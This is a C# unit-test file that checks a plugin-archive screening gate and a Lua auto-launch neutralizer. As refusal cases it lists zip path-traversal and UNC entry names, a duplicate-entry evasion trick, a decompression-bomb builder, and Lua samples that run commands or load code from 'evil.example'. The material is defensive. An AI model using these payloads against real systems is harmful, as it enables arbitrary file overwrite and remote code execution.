using System.IO;
using System.IO.Compression;
using System.Text;
using AwesomeAssertions;
using LuaToolsGui.Services;
using Xunit;

namespace LuaToolsGui.Tests;

/// <summary>
/// The gate between "plugin.zip verified" and "plugin.zip extracted into %AppData%".
///
/// <para>
/// <see cref="FixAnalyzerTests"/> covers the analyser itself. What is pinned HERE is the plugin flow's own
/// wiring of it, which is a separate thing that can regress on its own: that the screen runs at all (it did
/// not, before the audit — Fixes had the gate and Plugin silently did not), that it is given a real
/// destination root, and that a refusal comes back as a message rather than an exception.
/// </para>
///
/// <para>
/// The destination root is the part most easily broken by a well-meaning edit.
/// <see cref="FixAnalyzer.AnalyzeArchive"/> treats a null root as "entries are not extracted by path" and
/// skips containment and duplicate-destination checking entirely. Passing null would therefore leave the
/// call site looking correct while doing none of the work it exists for, so the escape cases below are
/// what prove the root is really being handed over.
/// </para>
/// </summary>
public sealed class PluginArchiveScreeningTests : IDisposable
{
    private readonly string _tmp = Path.Combine(Path.GetTempPath(), $"pluginzip_{Guid.NewGuid():N}");
    private readonly string _dest;

    public PluginArchiveScreeningTests()
    {
        _dest = Path.Combine(_tmp, "plugin");
        Directory.CreateDirectory(_dest);
    }

    public void Dispose()
    {
        try { if (Directory.Exists(_tmp)) Directory.Delete(_tmp, recursive: true); } catch (IOException) { }
    }

    /// <summary>Build a zip from (entryName → content) pairs, writing entry names verbatim.</summary>
    private string MakeZip(params (string Name, string Content)[] entries)
    {
        string path = Path.Combine(_tmp, $"{Guid.NewGuid():N}.zip");
        using var fs = File.Create(path);
        using var zip = new ZipArchive(fs, ZipArchiveMode.Create);
        foreach (var (name, content) in entries)
        {
            using var stream = zip.CreateEntry(name).Open();
            stream.Write(Encoding.UTF8.GetBytes(content));
        }
        return path;
    }

    private string Screen(string zipPath) => PluginInstallerService.ScreenPluginArchive(zipPath, _dest)!;

    // ══ Happy path ═════════════════════════════════════════════════════════════

    [Fact]
    public void A_real_plugin_layout_is_accepted()
    {
        // The shape the installer expects: public/luatools.js plus supporting files.
        string zip = MakeZip(
            ("public/luatools.js", "export const init = () => {};"),
            ("public/styles.css", "body{}"),
            ("package.json", "{\"name\":\"luatools\"}"));

        PluginInstallerService.ScreenPluginArchive(zip, _dest).Should()
            .BeNull("a legitimate release must install — over-blocking here breaks the Plugin page outright");
    }

    [Fact]
    public void A_wrapped_single_folder_layout_is_accepted()
    {
        // plugin.zip sometimes wraps everything in one top-level folder; NormalizeFrontendLayout hoists it
        // afterwards, so the screen must not object to the nesting.
        string zip = MakeZip(
            ("luatools-plugin/public/luatools.js", "export {};"),
            ("luatools-plugin/README.md", "# plugin"));

        PluginInstallerService.ScreenPluginArchive(zip, _dest).Should().BeNull();
    }

    // ══ Lua in a plugin is a PROGRAM, not a Steam manifest ═════════════════════
    // 1.4.0 screened plugin.zip with the manifest rules, so installing BetterSteamTools failed with
    // "backend/main.lua: the lua contains 'require', which a Steam manifest never needs". These pin the
    // profile actually being passed — dropping the argument silently restores the manifest rules and
    // breaks every plugin that ships Lua.

    [Fact]
    public void A_plugin_backend_using_require_is_accepted()
    {
        string zip = MakeZip(
            ("public/luatools.js", "export {};"),
            ("backend/main.lua", "local utils = require(\"utils\")\nreturn { start = utils.start }"));

        PluginInstallerService.ScreenPluginArchive(zip, _dest).Should()
            .BeNull("this is the exact archive shape that was refused in 1.4.0");
    }

    [Fact]
    public void A_plugin_backend_using_ordinary_lua_is_accepted()
    {
        string zip = MakeZip(
            ("public/luatools.js", "export {};"),
            ("backend/main.lua", """
                local json = require("json")
                local M = setmetatable({}, { __index = require("base") })
                function M.load(path)
                    local ok, data = pcall(function()
                        local f = io.open(path, "r")
                        return f and json.decode(f:read("*a")) or nil
                    end)
                    return ok and data or nil
                end
                return M
                """));

        PluginInstallerService.ScreenPluginArchive(zip, _dest).Should().BeNull();
    }

    [Theory]
    [InlineData("os.execute(\"calc.exe\")")]
    [InlineData("local h = io.popen(\"whoami\")")]
    [InlineData("loadstring(payload)()")]
    [InlineData("require(\"https://evil.example/mod.lua\")")]
    public void A_plugin_backend_that_executes_code_is_still_refused(string lua)
    {
        string zip = MakeZip(("public/luatools.js", "export {};"), ("backend/main.lua", lua));

        PluginInstallerService.ScreenPluginArchive(zip, _dest).Should().NotBeNull();
    }

    // ══ Malicious ══════════════════════════════════════════════════════════════

    [Theory]
    [InlineData("../../../evil.js")]
    [InlineData("public/../../../../evil.js")]
    [InlineData("..\\..\\Windows\\System32\\evil.dll")]
    public void Path_traversal_is_refused(string entryName)
    {
        string zip = MakeZip((entryName, "payload"));

        Screen(zip).Should().Contain("escapes");
    }

    [Theory]
    [InlineData(@"C:\Windows\System32\evil.dll")]
    [InlineData(@"\\attacker-share\evil.dll")]
    [InlineData(@"\evil.dll")]
    public void An_absolute_or_unc_entry_is_refused(string entryName)
    {
        // Path.Combine returns its second argument outright when that argument is rooted, which is how a
        // rooted entry name used to write wherever it liked.
        string zip = MakeZip((entryName, "payload"));

        Screen(zip).Should().Contain("absolute path");
    }

    [Fact]
    public void Two_entries_resolving_to_the_same_file_are_refused()
    {
        // Known analyser-evasion trick: the checker inspects one entry, the extractor's last write wins
        // with the other.
        string zip = MakeZip(
            ("public/luatools.js", "harmless"),
            ("public/./luatools.js", "payload"));

        Screen(zip).Should().Contain("same destination");
    }

    [Fact]
    public void A_decompression_bomb_is_refused()
    {
        // Above the 50 MB ratio floor and wildly compressible — the case ZipFile.ExtractToDirectory would
        // happily expand into %AppData%, because it guards paths and never size. Written in blocks rather
        // than one allocation so the test does not become the memory hog it is testing for.
        string path = Path.Combine(_tmp, "bomb.zip");
        using (var fs = File.Create(path))
        using (var zip = new ZipArchive(fs, ZipArchiveMode.Create))
        {
            using var stream = zip.CreateEntry("public/luatools.js").Open();
            byte[] block = Encoding.ASCII.GetBytes(new string('A', 1024 * 1024));
            for (int i = 0; i < 80; i++) stream.Write(block);
        }

        Screen(path).Should().Contain("decompression bomb");
    }

    [Fact]
    public void An_unreadable_archive_is_refused()
    {
        string notAZip = Path.Combine(_tmp, "corrupt.zip");
        File.WriteAllText(notAZip, "this is not a zip file");

        Screen(notAZip).Should().Contain("could not be read",
            "something that cannot be inspected must not be extracted");
    }

    // ══ False positives ════════════════════════════════════════════════════════

    [Fact]
    public void A_zip_carrying_executables_is_still_accepted()
    {
        // The plugin release genuinely ships binaries alongside the frontend. FixAnalyzer records
        // executable content as a note, never a block — if that ever flips, every plugin install breaks.
        string zip = MakeZip(
            ("public/luatools.js", "export {};"),
            ("winmm.dll", "MZ binary-ish"),
            ("tools/helper.exe", "MZ binary-ish"));

        PluginInstallerService.ScreenPluginArchive(zip, _dest).Should().BeNull();
    }

    [Fact]
    public void A_nested_archive_is_recorded_but_not_blocked()
    {
        string zip = MakeZip(
            ("public/luatools.js", "export {};"),
            ("assets/icons.zip", "PK-ish"));

        PluginInstallerService.ScreenPluginArchive(zip, _dest).Should().BeNull();
    }

    [Fact]
    public void A_small_highly_compressible_file_is_not_mistaken_for_a_bomb()
    {
        // The ratio rule only applies above a size floor, precisely so ordinary compressible assets pass.
        string zip = MakeZip(("public/luatools.js", new string('x', 64 * 1024)));

        PluginInstallerService.ScreenPluginArchive(zip, _dest).Should().BeNull();
    }

    // ══ Refusal shape ══════════════════════════════════════════════════════════

    [Fact]
    public void A_refusal_names_the_asset_and_the_reason()
    {
        string zip = MakeZip((@"C:\Windows\evil.dll", "payload"));

        Screen(zip).Should().Contain("plugin.zip").And.Contain("absolute path");
    }

    [Fact]
    public void Screening_reports_rather_than_throws_for_a_missing_file() =>
        PluginInstallerService.ScreenPluginArchive(Path.Combine(_tmp, "absent.zip"), _dest)
            .Should().NotBeNull("a missing staged file is a refusal, not an unhandled exception");

    // ══ "Steam opens clean" — backend/main.lua auto-launch neutralization ═════

    private const string SampleUpstreamBackendMainLua = """
        local logger = require("logger")
        local millennium = require("millennium")
        local http = require("http")
        local fs = require("fs")
        local m_utils = require("utils")

        local BACKEND_BASE = "http://127.0.0.1:38492"

        local function ensure_backend_running()
            local response = http.get(BACKEND_BASE .. "/has/0", { timeout = 2 })
            if response then return end -- already up

            local local_appdata = m_utils.getenv("LOCALAPPDATA")
            if not local_appdata or local_appdata == "" then
                logger.warn("LOCALAPPDATA not available, cannot launch LuaTools backend")
                return
            end

            local exe_path = local_appdata .. "\\LuaTools\\current\\LuaTools.exe"
            if not fs.exists(exe_path) then
                logger.warn("LuaTools.exe not found at " .. exe_path .. " (not installed?)")
                return
            end

            m_utils.exec('start "" "' .. exe_path .. '" --minimized')
            logger.log("Launched LuaTools backend: " .. exe_path)
        end

        function HasLuaToolsForApp(appid)
            return backend_request("/has/" .. tostring(appid), "GET")
        end

        function StartLuaToolsAdd(appid)
            return backend_request("/add/" .. tostring(appid), "POST")
        end

        local function on_load()
            logger.log("LuaTools injector stub loading")
            ensure_backend_running()
            copy_webkit_files()
            inject_webkit_files()
            millennium.ready()
        end

        return { on_load = on_load }
        """;

    [Fact]
    public void NeutralizeBackendAutoLaunchSource_disables_auto_launch_while_preserving_webkit_and_rpc()
    {
        string patched = PluginInstallerService.NeutralizeBackendAutoLaunchSource(SampleUpstreamBackendMainLua);

        // 1. ensure_backend_running() is short-circuited and its call in on_load() is commented out.
        patched.Should().Contain("if true then return end -- neutralized by LuaTools Amethyst (Steam opens clean)");
        patched.Should().Contain("-- ensure_backend_running() -- neutralized by LuaTools Amethyst (Steam opens clean)");
        patched.Should().Contain("-- m_utils.exec('start \"\" \"' .. exe_path .. '\" --minimized') -- neutralized by LuaTools Amethyst (Steam opens clean)");

        // 2. Webkit injection and RPC handlers remain active (not commented out).
        patched.Should().Contain("\n    copy_webkit_files()");
        patched.Should().Contain("\n    inject_webkit_files()");
        patched.Should().Contain("\n    millennium.ready()");
        patched.Should().Contain("function HasLuaToolsForApp(appid)");
        patched.Should().Contain("function StartLuaToolsAdd(appid)");

        // 3. Idempotent on repeated runs.
        PluginInstallerService.NeutralizeBackendAutoLaunchSource(patched).Should().Be(patched);
    }

    [Fact]
    public void NeutralizeBackendAutoLaunch_patches_file_on_disk_atomically_and_is_idempotent()
    {
        string backendDir = Path.Combine(_dest, "backend");
        Directory.CreateDirectory(backendDir);
        string mainLuaPath = Path.Combine(backendDir, "main.lua");
        File.WriteAllText(mainLuaPath, SampleUpstreamBackendMainLua);

        PluginInstallerService.NeutralizeBackendAutoLaunch(_dest).Should().BeTrue();
        string afterFirst = File.ReadAllText(mainLuaPath);
        afterFirst.Should().Contain("-- ensure_backend_running() -- neutralized by LuaTools Amethyst");

        // Second pass is a no-op and returns false.
        PluginInstallerService.NeutralizeBackendAutoLaunch(_dest).Should().BeFalse();
        File.ReadAllText(mainLuaPath).Should().Be(afterFirst);
    }

    [Theory]
    [InlineData("\n")]
    [InlineData("\r\n")]
    public void NeutralizeBackendAutoLaunchSource_does_not_corrupt_multiline_exec_calls_while_still_neutralizing_auto_launch(string eol)
    {
        const string multilineLua = """
            local function ensure_backend_running()
                local exe_path = "C:\\LuaTools\\current\\LuaTools.exe"
                m_utils.exec(
                    'start "" "' .. exe_path .. '" --minimized'
                )
            end

            local function on_load()
                ensure_backend_running()
                millennium.ready()
            end
            """;

        string input = multilineLua.ReplaceLineEndings(eol);
        string patched = PluginInstallerService.NeutralizeBackendAutoLaunchSource(input);
        string normalized = patched.ReplaceLineEndings("\n");

        // 1. ensure_backend_running() is short-circuited and its call in on_load() is commented out.
        normalized.Should().Contain("if true then return end -- neutralized by LuaTools Amethyst (Steam opens clean)");
        normalized.Should().Contain("-- ensure_backend_running() -- neutralized by LuaTools Amethyst (Steam opens clean)");

        // 2. The multi-line m_utils.exec( ... ) is NOT half-commented (which would leave dangling argument/closing lines).
        normalized.Should().NotContain("-- m_utils.exec(");
        normalized.Should().Contain("    m_utils.exec(\n        'start \"\" \"' .. exe_path .. '\" --minimized'\n    )");
    }

    [Fact]
    public void Multiline_exec_is_reported_only_outside_ensure_backend_running()
    {
        const string lua = """
            local function ensure_backend_running()
                m_utils.exec('start "" "' .. exe_path ..
                    '" --minimized')
            end

            local function relaunch()
                m_utils.exec('start "" "' .. exe_path ..
                    '" --minimized')
            end
            """;
        var skipped = new List<int>();

        PluginInstallerService.NeutralizeBackendAutoLaunchSource(lua, skipped);

        // Line 2 sits behind the injected "if true then return end" and is inert; line 7 is the one to report.
        skipped.Should().Equal(7);
    }

    [Fact]
    public void Skipped_exec_lines_are_logged_once_per_instance_even_under_concurrent_polls()
    {
        var logged = new System.Collections.Concurrent.ConcurrentDictionary<int, byte>();

        PluginInstallerService.NewSkipsToLog(logged, [7]).Should().Equal(7);
        PluginInstallerService.NewSkipsToLog(logged, [7]).Should().BeEmpty("the status poll re-runs the neutralizer");
        PluginInstallerService.NewSkipsToLog(logged, [7, 9]).Should().Equal(9);

        var concurrent = new System.Collections.Concurrent.ConcurrentDictionary<int, byte>();
        int reported = 0;
        Parallel.For(0, 64, _ => Interlocked.Add(ref reported, PluginInstallerService.NewSkipsToLog(concurrent, [3]).Count));
        reported.Should().Be(1);
    }
}
